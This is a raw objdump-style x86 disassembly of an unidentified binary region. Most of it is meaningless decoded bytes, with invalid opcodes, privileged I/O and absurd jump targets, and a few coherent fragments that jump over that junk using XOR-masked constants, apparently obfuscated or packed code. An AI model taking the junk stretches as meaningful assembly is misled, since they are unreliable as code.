  40bcf5:	sub    DWORD PTR [edi],esi
  40bcf7:	inc    edi
  40bcf8:	arpl   WORD PTR [eax+0x10],di
  40bcfb:	inc    edi
  40bcfc:	call   0x4a4fca53
  40bd01:	int3   
  40bd02:	sbb    DWORD PTR [edx-0x42],edx
  40bd05:	pop    ss
  40bd06:	jo     0x40bced
  40bd08:	xor    ebx,DWORD PTR [ebx+0x60]
  40bd0b:	sub    eax,0x38fa846f
  40bd10:	loop   0x40bd18
  40bd12:	lods   eax,DWORD PTR ds:[esi]
  40bd13:	pop    ecx
  40bd14:	dec    ebp
  40bd15:	les    ebp,FWORD PTR [ebx-0x74]
  40bd18:	in     eax,0xfa
  40bd1a:	ret    
  40bd1b:	push   esp
  40bd1c:	jne    0x40bcd1
  40bd1e:	push   cs
  40bd1f:	push   0x2f24733f
  40bd24:	or     DWORD PTR fs:[esi-0x4b],ebx
  40bd28:	add    BYTE PTR [esi+0x50c08916],ah
  40bd2e:	lea    esi,[ecx+0x50]
  40bd31:	sub    al,0x6d
  40bd33:	lods   eax,DWORD PTR ds:[esi]
  40bd34:	xlat   BYTE PTR ds:[ebx]
  40bd35:	out    0xa9,al
  40bd37:	mov    dl,0x1f
  40bd39:	mov    esi,0x6cdcab70
  40bd3e:	cmp    ebp,DWORD PTR [edx-0x1]
  40bd41:	xor    al,0xc4
  40bd43:	pop    es
  40bd44:	cli    
  40bd45:	psadbw mm6,QWORD PTR [ecx]
  40bd48:	jg     0x40bd8a
  40bd4a:	pop    eax
  40bd4b:	inc    edi
  40bd4c:	xor    al,al
  40bd4e:	imul   edi,DWORD PTR cs:[ebx-0x29],0x2fc5b3a0
  40bd56:	mov    ds:0xf3d44e59,al
  40bd5b:	out    dx,eax
  40bd5c:	fld    QWORD PTR [eax-0x2bd18e59]
  40bd62:	fst    QWORD PTR [ebx+0x25]
  40bd65:	inc    esi
  40bd66:	push   ss
  40bd67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd68:	or     ebx,DWORD PTR [ecx-0x75aeb7e6]
  40bd6e:	ret    
  40bd6f:	ror    BYTE PTR [edx],cl
  40bd71:	lods   eax,DWORD PTR ds:[esi]
  40bd72:	fidiv  WORD PTR [ebx]
  40bd74:	jmp    0x40bd49
  40bd76:	adc    eax,0x9a82a20f
  40bd7b:	pushf  
  40bd7c:	inc    ecx
  40bd7d:	je     0x40bd99
  40bd7f:	inc    eax
  40bd80:	adc    eax,0x4775e039
  40bd85:	loope  0x40bd5d
  40bd87:	ja     0x40bdde
  40bd89:	imul   esi,DWORD PTR [esi+0x3d73c204],0x2bbbe802
  40bd93:	fstp   TBYTE PTR [ebx+0x753fc253]
  40bd99:	push   edi
  40bd9a:	jo     0x40be00
  40bd9c:	inc    eax
  40bd9d:	xor    eax,0x9d129323
  40bda2:	(bad)  
  40bda3:	and    bh,BYTE PTR [ecx+0x696fb1e9]
  40bda9:	xor    eax,0xf20d51e1
  40bdae:	retf   0x610c
  40bdb1:	repnz repnz scas eax,DWORD PTR es:[edi]
  40bdb4:	sub    DWORD PTR [edx],ebp
  40bdb6:	scas   eax,DWORD PTR es:[edi]
  40bdb7:	or     edx,esp
  40bdb9:	in     eax,0xd6
  40bdbb:	sbb    DWORD PTR [ecx],edi
  40bdbd:	or     BYTE PTR [esi-0x80],bl
  40bdc0:	adc    eax,DWORD PTR [edi]
  40bdc2:	inc    ebp
  40bdc3:	mov    ch,dh
  40bdc5:	push   esp
  40bdc6:	push   es
  40bdc7:	mov    edi,0x8998fc13
  40bdcc:	cs push 0xb7daa31
  40bdd2:	(bad)  
  40bdd3:	jmp    0x4ba7:0x4f98d945
  40bdda:	pop    ecx
  40bddb:	sar    BYTE PTR [edi+edi*1],1
  40bdde:	cmp    al,0x43
  40bde0:	sbb    DWORD PTR [esi-0x7e],edi
  40bde3:	lds    ecx,FWORD PTR [ebp-0x771e93cb]
  40bde9:	mov    al,ch
  40bdeb:	push   ecx
  40bdec:	enter  0xee43,0x13
  40bdf0:	mov    al,ds:0x140345b
  40bdf5:	jecxz  0x40bd85
  40bdf7:	ds dec edx
  40bdf9:	inc    edx
  40bdfa:	adc    al,bl
  40bdfc:	ja     0x40bdbe
  40bdfe:	xchg   al,dl
  40be00:	mov    bl,0x18
  40be02:	push   cs
  40be03:	popa   
  40be04:	clc    
  40be05:	pusha  
  40be06:	inc    ebx
  40be07:	xchg   esi,eax
  40be08:	stos   DWORD PTR es:[edi],eax
  40be09:	pop    ss
  40be0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0b:	add    eax,0x7e2e40e7
  40be10:	dec    esp
  40be11:	iret   
  40be12:	xor    bh,BYTE PTR [edi]
  40be14:	mov    dl,0x26
  40be16:	(bad)  [esi-0x1d]
  40be19:	push   cs
  40be1a:	mov    edx,tr3
  40be1d:	cli    
  40be1e:	mov    al,BYTE PTR [ebp+0x193c4e6a]
  40be24:	shl    DWORD PTR [ebp-0x3],0xf4
  40be28:	sub    BYTE PTR [ebp+0x3],0xe4
  40be2c:	mov    dl,0x79
  40be2e:	(bad)  
  40be2f:	fcom   QWORD PTR [esp+edi*1]
  40be32:	fbstp  TBYTE PTR [edx+eiz*1+0x1c]
  40be36:	xor    BYTE PTR [edx+edi*1+0x64690f7c],cl
  40be3d:	out    dx,al
  40be3e:	int3   
  40be3f:	lock aam 0xa3
  40be42:	ds mov ch,0x8
  40be45:	std    
  40be46:	adc    al,0x66
  40be48:	jbe    0x40be2d
  40be4a:	lock (bad) 
  40be4c:	shl    ebp,cl
  40be4e:	aas    
  40be4f:	loopne 0x40bdd6
  40be51:	mov    bh,0x9a
  40be53:	push   ss
  40be54:	ret    0x71d2
  40be57:	jo     0x40be92
  40be59:	jb     0x40bec9
  40be5b:	out    0x6e,eax
  40be5d:	sbb    BYTE PTR [ebx-0x2],0xba
  40be61:	test   DWORD PTR [ebp+0x40],ecx
  40be64:	hlt    
  40be65:	mov    ebp,0x69e284c9
  40be6a:	(bad)  
  40be6b:	jbe    0x40be4f
  40be6d:	shl    DWORD PTR [eax+0xf5b755],0x4d
  40be74:	adc    bl,bh
  40be76:	cmp    esi,DWORD PTR [ecx+0x4a]
  40be79:	cmp    BYTE PTR [edi+0x1f],bl
  40be7c:	push   es
  40be7d:	mov    bh,0xad
  40be7f:	jne    0x40be9c
  40be81:	cmp    dl,BYTE PTR [eax-0x4e]
  40be84:	js     0x40bed5
  40be86:	ficomp DWORD PTR [ebx-0x35]
  40be89:	push   ebp
  40be8a:	int    0xfd
  40be8c:	retf   0x941e
  40be8f:	and    al,0x5d
  40be91:	xchg   edx,eax
  40be92:	lahf   
  40be93:	push   esi
  40be94:	xchg   edx,eax
  40be95:	retf   0x7089
  40be98:	fs inc esi
  40be9a:	xchg   edx,eax
  40be9b:	ja     0x40be23
  40be9d:	sub    bh,dl
  40be9f:	xchg   edi,eax
  40bea0:	add    DWORD PTR [esi+0x227d592c],edi
  40bea6:	push   ebp
  40bea7:	inc    eax
  40bea8:	dec    esi
  40bea9:	enter  0x5b99,0xf
  40bead:	jp     0x40bee4
  40beaf:	mov    edi,DWORD PTR [ebp+0x2e]
  40beb2:	sti    
  40beb3:	cmp    BYTE PTR [ebp-0x13],0x88
  40beb7:	mov    edi,0xf9d3df6c
  40bebc:	sar    DWORD PTR [edx],0x5
  40bebf:	cmp    ebp,DWORD PTR [edi+ebx*4+0x67]
  40bec3:	sub    eax,DWORD PTR [edi-0x22]
  40bec6:	pop    ds
  40bec7:	enter  0xf179,0xc1
  40becb:	ficom  WORD PTR [ebp+0x48cf2c1]
  40bed1:	loope  0x40bf35
  40bed3:	jb     0x40bf2a
  40bed5:	loop   0x40bf17
  40bed7:	add    BYTE PTR [edx+edx*8+0x56be3f6f],bh
  40bede:	inc    ebp
  40bedf:	sbb    esp,ebx
  40bee1:	stc    
  40bee2:	ret    
  40bee3:	xlat   BYTE PTR ds:[ebx]
  40bee4:	add    ch,BYTE PTR [ecx+0x2a]
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x342df4cf]
  40bf27:	fild   WORD PTR [eax+0x387e7ef9]
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf32
  40bf31:	rol    DWORD PTR [ebp-0x72e47565],1
  40bf37:	sub    dh,BYTE PTR [ebx]
  40bf39:	push   cs
  40bf3a:	daa    
  40bf3b:	push   eax
  40bf3c:	retf   0xf139
  40bf3f:	icebp  
  40bf40:	fisubr DWORD PTR [ecx]
  40bf42:	jecxz  0x40bfa7
  40bf44:	mov    esp,0x7ca25819
  40bf49:	out    dx,al
  40bf4a:	sub    eax,0xc2ada005
  40bf4f:	adc    ch,BYTE PTR [ebp-0x1b]
  40bf52:	xchg   esp,eax
  40bf53:	cmp    BYTE PTR [edi-0x70],ah
  40bf56:	outs   dx,DWORD PTR ds:[esi]
  40bf57:	xchg   edx,eax
  40bf58:	pop    ds
  40bf59:	ja     0x40bfb3
  40bf5b:	outs   dx,DWORD PTR ds:[esi]
  40bf5c:	jle    0x40befc
  40bf5e:	adc    al,BYTE PTR [ebx+ecx*8]
  40bf61:	mov    ds:0x55c69257,al
  40bf66:	push   esp
  40bf67:	jl     0x40bf31
  40bf69:	jbe    0x40bfd7
  40bf6b:	jge    0x40bfde
  40bf6d:	imul   ebx,DWORD PTR [ecx],0xcd8813f5
  40bf73:	adc    al,0x6a
  40bf75:	lock dec ebx
  40bf77:	int    0xa1
  40bf79:	xchg   ebp,eax
  40bf7a:	mov    ah,0xa8
  40bf7c:	aas    
  40bf7d:	test   al,0x31
  40bf7f:	adc    ebp,0xad8f18c9
  40bf85:	inc    esp
  40bf86:	imul   ebx,DWORD PTR [ebx+0x72],0xdc729ff7
  40bf8d:	lds    eax,FWORD PTR [esi+edx*4-0x4fbe7d84]
  40bf94:	cmp    ecx,DWORD PTR [edi-0x7e]
  40bf97:	dec    edi
  40bf98:	xchg   ebx,eax
  40bf99:	mov    al,ds:0xaf6d5b64
  40bf9e:	cmc    
  40bf9f:	jns    0x40bf34
  40bfa1:	adc    DWORD PTR [edi-0x11cd5e0c],edi
  40bfa7:	xchg   edx,eax
  40bfa8:	pop    ebx
  40bfa9:	lods   eax,DWORD PTR ds:[esi]
  40bfaa:	stos   BYTE PTR es:[edi],al
  40bfab:	pop    esp
  40bfac:	and    al,0x35
  40bfae:	jge    0x40c00d
  40bfb0:	and    BYTE PTR [ebx+0x13],0x71
  40bfb4:	das    
  40bfb5:	inc    eax
  40bfb6:	mov    bl,0x65
  40bfb8:	(bad)  
  40bfb9:	out    dx,eax
  40bfba:	and    ah,0x7d
  40bfbd:	xchg   ebp,eax
  40bfbe:	aas    
  40bfbf:	mov    edi,0xe01a6a5e
  40bfc4:	cmp    ecx,ecx
  40bfc6:	imul   ebp,ebp,0x5b
  40bfc9:	inc    eax
  40bfca:	outs   dx,DWORD PTR ds:[esi]
  40bfcb:	shl    BYTE PTR [ecx+0x4a],cl
  40bfce:	dec    edi
  40bfcf:	enter  0x71b8,0x23
  40bfd3:	fild   QWORD PTR [eax-0x5d]
  40bfd6:	clc    
  40bfd7:	mov    DWORD PTR [ebp-0x6247d501],eax
  40bfdd:	xchg   edx,eax
  40bfde:	outs   dx,BYTE PTR ds:[esi]
  40bfdf:	sar    DWORD PTR [ecx-0x36eea958],1
  40bfe5:	mov    al,ds:0x974a5580
  40bfea:	jmp    0xe5a54e59
  40bfef:	xchg   BYTE PTR [edi],ch
  40bff1:	push   ecx
  40bff2:	cmp    ch,BYTE PTR [esi+0x71]
  40bff5:	out    0x1d,al
  40bff7:	mov    dl,BYTE PTR [esi]
  40bff9:	lahf   
  40bffa:	ficom  DWORD PTR [ecx-0x53]
  40bffd:	or     ecx,edx
  40bfff:	test   eax,0xa62de578
  40c004:	test   DWORD PTR [edx+0x6e],0xd0b77d4c
  40c00b:	adc    BYTE PTR [ebx],al
  40c00d:	cli    
  40c00e:	pop    es
  40c00f:	jo     0x40bfaf
  40c011:	push   ebp
  40c012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c013:	jl     0x40c002
  40c015:	fwait
  40c016:	mov    ah,0xfa
  40c018:	jmp    0x1b12:0xf021589c
  40c01f:	out    dx,al
  40c020:	test   bh,al
  40c022:	dec    ecx
  40c023:	or     ah,ch
  40c025:	out    dx,al
  40c026:	adc    al,0x24
  40c028:	xchg   esp,eax
  40c029:	repz adc ax,0x8bcf
  40c02e:	and    ah,al
  40c030:	jecxz  0x40bff7
  40c032:	aas    
  40c033:	fs push ebp
  40c035:	in     eax,0x21
  40c037:	pop    es
  40c038:	adc    al,0xb9
  40c03a:	adc    DWORD PTR [ecx+esi*8-0x7e9a77d1],0x18d20b5d
  40c045:	mov    eax,?
  40c047:	icebp  
  40c048:	lahf   
  40c049:	push   ebp
  40c04a:	pop    ecx
  40c04b:	mov    edi,0x779fc52f
  40c050:	iret   
  40c051:	pop    edx
  40c052:	or     bl,BYTE PTR [esi-0x75db2680]
  40c058:	dec    ecx
  40c059:	shl    BYTE PTR [edx+0x257d2e],cl
  40c05f:	adc    bh,0xdf
  40c062:	sub    eax,0xb4e5b4e7
  40c067:	not    BYTE PTR [edi+0x79]
  40c06a:	or     eax,DWORD PTR [ebp+edi*1-0x36]
  40c06e:	outs   dx,BYTE PTR ds:[esi]
  40c06f:	jnp    0x40c052
  40c071:	push   ebx
  40c072:	xchg   esi,eax
  40c073:	mov    dh,0x4b
  40c075:	pop    ebp
  40c076:	into   
  40c077:	lods   eax,DWORD PTR ds:[esi]
  40c078:	and    DWORD PTR [ebx-0x6b8723d1],ecx
  40c07e:	mov    DWORD PTR [ebx+0x34],ebx
  40c081:	jne    0x40c0a6
  40c083:	and    dh,BYTE PTR [eax+0x52bcc68a]
  40c089:	dec    eax
  40c08a:	pushf  
  40c08b:	push   edi
  40c08c:	ins    DWORD PTR es:[edi],dx
  40c08d:	dec    edi
  40c08e:	(bad)  
  40c090:	sbb    DWORD PTR [ecx-0x2258c5be],0xffffffd8
  40c097:	fld    QWORD PTR [esp+esi*1-0x5e]
  40c09b:	sub    edx,DWORD PTR [esi+esi*4+0x48]
  40c09f:	outs   dx,BYTE PTR ds:[esi]
  40c0a0:	sub    al,0x2
  40c0a2:	mov    esi,ebp
  40c0a4:	popa   
  40c0a5:	xchg   edx,eax
  40c0a6:	pushf  
  40c0a7:	sbb    BYTE PTR [ecx+0x64],dl
  40c0aa:	push   0x34890156
  40c0af:	or     dh,al
  40c0b1:	test   al,0x80
  40c0b3:	add    DWORD PTR [ebx+esi*4],ebx
  40c0b6:	jae    0x40c0c6
  40c0b8:	dec    esi
  40c0b9:	iret   
  40c0ba:	outs   dx,BYTE PTR ds:[esi]
  40c0bb:	es daa 
  40c0bd:	stos   DWORD PTR es:[edi],eax
  40c0be:	fmul   QWORD PTR [ebx-0x698d0a37]
  40c0c4:	jo     0x40c137
  40c0c6:	cmp    BYTE PTR [edx],bl
  40c0c8:	rcr    ebp,cl
  40c0ca:	xor    al,0x98
  40c0cc:	and    ebp,edx
  40c0ce:	ins    DWORD PTR es:[edi],dx
  40c0cf:	out    0x46,eax
  40c0d1:	in     al,0x5d
  40c0d3:	push   edx
  40c0d4:	mov    ah,0x48
  40c0d6:	mov    ?,WORD PTR [ecx]
  40c0d8:	dec    ebx
  40c0d9:	mov    ecx,0x64ac6bf7
  40c0de:	cmp    ebp,DWORD PTR [esi+0x82dcd45]
  40c0e4:	inc    ebp
  40c0e5:	push   esp
  40c0e6:	jns    0x40c13f
  40c0e8:	xchg   esi,eax
  40c0e9:	dec    edx
  40c0ea:	sbb    DWORD PTR ds:0xeb23773,0x49e9fa25
  40c0f4:	sub    DWORD PTR [ecx*8-0x46e3dde0],eax
  40c0fb:	push   ecx
  40c0fc:	leave  
  40c0fd:	in     al,0x1
  40c0ff:	cmp    DWORD PTR ds:0x149049e7,ebx
  40c105:	lods   al,BYTE PTR ds:[esi]
  40c106:	call   0x79fa7d1c
  40c10b:	div    BYTE PTR [edi+0x40]
  40c10e:	xchg   bh,bh
  40c110:	rol    DWORD PTR [esi+0x196642f],0xa2
  40c117:	hlt    
  40c118:	and    BYTE PTR [edx+0x5c],0x3e
  40c11c:	leave  
  40c11d:	xchg   edi,eax
  40c11e:	add    al,0x0
  40c120:	adc    eax,0x620e39d2
  40c125:	or     eax,0x9f3ce1e5
  40c12a:	mov    ch,0x26
  40c12c:	das    
  40c12d:	mov    al,0xae
  40c12f:	adc    al,0xb7
  40c131:	add    eax,0xaad7c557
  40c136:	jo     0x40c133
  40c138:	mov    cl,BYTE PTR [eax-0x1d11540b]
  40c13e:	cwde   
  40c13f:	or     al,0xce
  40c141:	mov    edx,0xabc22f9d
  40c146:	inc    esi
  40c147:	cdq    
  40c148:	cmp    DWORD PTR [ecx+0x63],esp
  40c14b:	out    dx,al
  40c14c:	mov    WORD PTR [edi+0x66669cd],fs
  40c152:	mov    cl,0x16
  40c154:	xchg   ebp,eax
  40c156:	fwait
  40c157:	push   ds
  40c158:	mov    BYTE PTR ds:0x97f47cf1,cl
  40c15e:	fld    QWORD PTR [esi+0x7f]
  40c161:	lods   eax,DWORD PTR ds:[esi]
  40c162:	sahf   
  40c163:	adc    edx,DWORD PTR ds:0xfbf57dd3
  40c169:	leave  
  40c16a:	inc    edi
  40c16b:	inc    edi
  40c16c:	adc    eax,0x5d534c8c
  40c171:	pop    ebx
  40c172:	sbb    BYTE PTR [esi-0x3478bd97],ah
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x15
  40c196:	jno    0x40c1ad
  40c198:	mov    al,ds:0x7e7e874a
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	or     edx,DWORD PTR [edi]
  40c1a3:	ret    
  40c1a4:	ds fwait
  40c1a6:	inc    ebx
  40c1a7:	retf   0xb493
  40c1aa:	xchg   edi,edi
  40c1ac:	pop    ss
  40c1ad:	xchg   ebp,eax
  40c1ae:	push   edx
  40c1af:	inc    ebx
  40c1b0:	fs sahf 
  40c1b2:	or     eax,0x424cf218
  40c1b7:	push   DWORD PTR [edi+ebp*8]
  40c1ba:	mov    esp,DWORD PTR [ebp-0x45b0dda]
  40c1c0:	fcmovnb st,st(5)
  40c1c2:	sub    DWORD PTR [edx],ebp
  40c1c4:	mov    al,0x29
  40c1c6:	cmp    eax,0x2ff03ba0
  40c1cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1cc:	push   esi
  40c1cd:	push   edi
  40c1ce:	xchg   ecx,esp
  40c1d0:	scas   al,BYTE PTR es:[edi]
  40c1d1:	jno    0x40c1da
  40c1d3:	sub    eax,DWORD PTR [esi]
  40c1d5:	and    BYTE PTR [ecx],ch
  40c1d7:	leave  
  40c1d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1d9:	adc    eax,0xd6e9fc21
  40c1de:	adc    eax,DWORD PTR [esi+edi*1]
  40c1e1:	mov    BYTE PTR [ebx-0x28],bl
  40c1e4:	pop    esi
  40c1e5:	les    edi,FWORD PTR [esi+eax*8-0x68]
  40c1e9:	popa   
  40c1ea:	jecxz  0x40c22c
  40c1ec:	nop
  40c1ed:	xchg   ecx,eax
  40c1ee:	and    BYTE PTR [ebx],bh
  40c1f0:	not    BYTE PTR [ebp-0x80]
  40c1f3:	call   0x47882f3
  40c1f8:	jle    0x40c1f6
  40c1fa:	xchg   edx,eax
  40c1fb:	push   esp
  40c1fc:	pop    eax
  40c1fd:	xor    ecx,esp
  40c1ff:	pop    esi
  40c200:	push   ecx
  40c201:	out    0x5b,al
  40c203:	jo     0x40c1e2
  40c205:	mov    edx,0xd3f8d679
  40c20a:	test   al,0x6b
  40c20c:	xlat   BYTE PTR ds:[ebx]
  40c20d:	dec    edi
  40c20e:	retf   0x78e2
  40c211:	lods   eax,DWORD PTR ds:[esi]
  40c212:	(bad)  
  40c213:	push   ecx
  40c214:	inc    edx
  40c215:	xchg   BYTE PTR [edi-0x1c2f9651],dl
  40c21b:	(bad)  ds:0x48f55b47
  40c221:	adc    ebp,DWORD PTR [edx+ebp*8]
  40c224:	js     0x40c1f4
  40c226:	cmp    bh,BYTE PTR [ecx+eax*8+0x56]
  40c22a:	mov    ebp,0x4929e4b4
  40c22f:	shr    edi,0xf
  40c232:	daa    
  40c233:	sub    esi,esi
  40c235:	jmp    0x40c255
  40c237:	push   ebp
  40c238:	xchg   edx,eax
  40c239:	cmp    BYTE PTR [ebp+0x37],ah
  40c23c:	inc    ecx
  40c23d:	icebp  
  40c23e:	sbb    al,0xa5
  40c240:	cmp    DWORD PTR [eax-0x19685ee9],esp
  40c246:	sub    esp,DWORD PTR cs:[edx-0x5c]
  40c24a:	test   DWORD PTR [esi],edi
  40c24c:	nop
  40c24d:	mov    eax,0x50f996df
  40c252:	enter  0x93aa,0xcb
  40c256:	inc    edx
  40c257:	out    0x44,eax
  40c259:	test   ebx,ebp
  40c25b:	mul    esp
  40c25d:	mov    edx,0x2671cd67
  40c262:	xor    al,0x47
  40c264:	(bad)  
  40c265:	fbld   TBYTE PTR [ecx-0x39d169a7]
  40c26b:	jmp    0x40c2a0
  40c26d:	std    
  40c26e:	mov    ebx,0x78b1d1d1
  40c273:	stos   BYTE PTR es:[edi],al
  40c274:	push   0xfffffff4
  40c276:	sub    eax,0x6b869875
  40c27b:	not    DWORD PTR [eax-0x3484201b]
  40c281:	lahf   
  40c282:	mov    bh,0x18
  40c284:	mov    ebx,0x310a9a5f
  40c289:	es (bad) 
  40c28b:	dec    ebp
  40c28c:	mov    ?,esi
  40c28e:	inc    edx
  40c28f:	adc    DWORD PTR [edi+0x47],edi
  40c292:	cmp    eax,0xabd3652c
  40c297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c298:	int3   
  40c299:	and    esp,esp
  40c29b:	arpl   di,ax
  40c29d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c29e:	aad    0x91
  40c2a0:	mov    al,ds:0xed81fcd3
  40c2a5:	cmp    ebx,edi
  40c2a7:	mov    ebx,0x80df393a
  40c2ac:	cld    
  40c2ad:	js     0x40c31b
  40c2af:	mov    al,0x7b
  40c2b1:	fld    QWORD PTR [esi+esi*2-0x7f07a20]
  40c2b8:	test   al,0xd3
  40c2ba:	mov    bl,0x9
  40c2bc:	xchg   esi,eax
  40c2bd:	mov    ch,0xf1
  40c2bf:	out    dx,al
  40c2c0:	imul   ebx,DWORD PTR [ebx+0xf],0xe2c446f8
  40c2c7:	int    0x41
  40c2c9:	pop    ecx
  40c2ca:	xlat   BYTE PTR ds:[ebx]
  40c2cb:	pop    eax
  40c2cc:	lods   al,BYTE PTR ds:[esi]
  40c2cd:	nop
  40c2ce:	mov    edx,0x709fa85d
  40c2d3:	adc    al,0x72
  40c2d5:	data16 mov ds:0xaee242e0,al
  40c2db:	sahf   
  40c2dc:	push   esp
  40c2dd:	lds    eax,FWORD PTR ds:[esi+eiz*1]
  40c2e1:	(bad)  
  40c2e2:	sub    al,0x64
  40c2e4:	not    BYTE PTR [edi]
  40c2e6:	test   eax,0xce6b54ac
  40c2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ec:	xor    eax,0x30bede74
  40c2f1:	test   DWORD PTR [esi],eax
  40c2f3:	lods   eax,DWORD PTR ds:[esi]
  40c2f4:	jg     0x40c288
  40c2f6:	sbb    al,0x4f
  40c2f8:	lds    esp,FWORD PTR ds:0x9fa64075
  40c2fe:	pop    esp
  40c2ff:	daa    
  40c300:	push   esp
  40c301:	iret   
  40c302:	fwait
  40c303:	out    dx,al
  40c304:	(bad)  
  40c306:	push   eax
  40c307:	or     bh,dh
  40c309:	imul   DWORD PTR [eax]
  40c30b:	jp     0x86a60ebb
  40c311:	lock dec esp
  40c313:	inc    edi
  40c314:	add    al,0x76
  40c316:	out    dx,al
  40c317:	xchg   esi,eax
  40c318:	mov    bh,dl
  40c31a:	addr16 pop ebx
  40c31c:	mov    al,ds:0x4a60172e
  40c321:	cli    
  40c322:	dec    edi
  40c323:	xlat   BYTE PTR ds:[ebx]
  40c324:	aaa    
  40c325:	xor    BYTE PTR ds:0xc2094829,bh
  40c32b:	ds or  dl,bh
  40c32e:	inc    eax
  40c32f:	jnp    0x40c371
  40c331:	fs js  0x40c316
  40c334:	pop    edx
  40c335:	stos   BYTE PTR es:[edi],al
  40c336:	pop    ebp
  40c337:	clc    
  40c338:	sub    DWORD PTR [eax-0xe],edi
  40c33b:	add    eax,0x67ab66de
  40c340:	std    
  40c341:	add    edi,esi
  40c343:	inc    esp
  40c344:	addr16 jne 0x40c398
  40c347:	(bad)  
  40c348:	cmp    al,0x76
  40c34a:	aas    
  40c34b:	and    DWORD PTR [esi-0x1e2a98ab],ebp
  40c351:	push   es
  40c352:	add    DWORD PTR [esi-0x5],eax
  40c355:	int    0xce
  40c357:	xchg   esi,eax
  40c358:	mov    ?,WORD PTR [esi+0xbbcf9d3]
  40c35e:	pop    edi
  40c35f:	inc    edi
  40c360:	dec    eax
  40c361:	test   BYTE PTR [eax],dl
  40c363:	lahf   
  40c364:	mov    bl,0x82
  40c366:	inc    ecx
  40c367:	(bad)  
  40c368:	and    BYTE PTR ds:0xeeea1984,al
  40c36e:	mov    BYTE PTR [eax],bh
  40c370:	cdq    
  40c371:	sub    ebp,DWORD PTR [esi]
  40c373:	ja     0x40c3a6
  40c375:	pop    es
  40c376:	std    
  40c377:	xchg   ebp,eax
  40c378:	or     DWORD PTR [eax],ebp
  40c37a:	in     al,0x61
  40c37c:	ins    DWORD PTR es:[edi],dx
  40c37d:	idiv   BYTE PTR [ecx+0x4eb37337]
  40c383:	xor    esp,DWORD PTR [edx]
  40c385:	repz or eax,0x64cf8ab2
  40c38b:	cmp    al,ah
  40c38d:	mov    eax,ds:0xe287e6b6
  40c392:	sbb    esi,DWORD PTR [eax-0x1f]
  40c395:	mov    edi,0x444d1a1e
  40c39a:	sbb    WORD PTR [eax-0x52],ax
  40c39e:	pfcmpgt mm1,QWORD PTR [esi-0x324bdf79]
  40c3a6:	push   0xfffffff1
  40c3a8:	pop    ecx
  40c3a9:	pop    ebx
  40c3aa:	retf   
  40c3ab:	jl     0x40c38b
  40c3ad:	(bad)
  40c3b0:	mov    ecx,0x608afa14
  40c3b5:	(bad)  
  40c3b6:	das    
  40c3b7:	jle    0x40c36d
  40c3b9:	fist   DWORD PTR [ebp+0x187bc82e]
  40c3bf:	xchg   esi,eax
  40c3c0:	jl     0x40c408
  40c3c2:	pushf  
  40c3c3:	inc    ebx
  40c3c4:	cmp    ch,BYTE PTR [eax]
  40c3c6:	pusha  
  40c3c7:	pop    ebp
  40c3c8:	lods   eax,DWORD PTR ds:[esi]
  40c3c9:	xor    esp,ebp
  40c3cb:	repz xor al,0xe9
  40c3ce:	in     al,0x99
  40c3d0:	or     bl,BYTE PTR [esi-0x1b]
  40c3d3:	hlt    
  40c3d4:	test   eax,0x63a16f4b
  40c3d9:	add    al,0x91
  40c3db:	inc    eax
  40c3dc:	pop    edi
  40c3dd:	pop    ds
  40c3de:	scas   eax,DWORD PTR es:[edi]
  40c3df:	pop    esp
  40c3e0:	mov    ebx,0x6eda2ec7
  40c3e5:	test   DWORD PTR [edx-0x4603ba75],ebx
  40c3eb:	push   esp
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
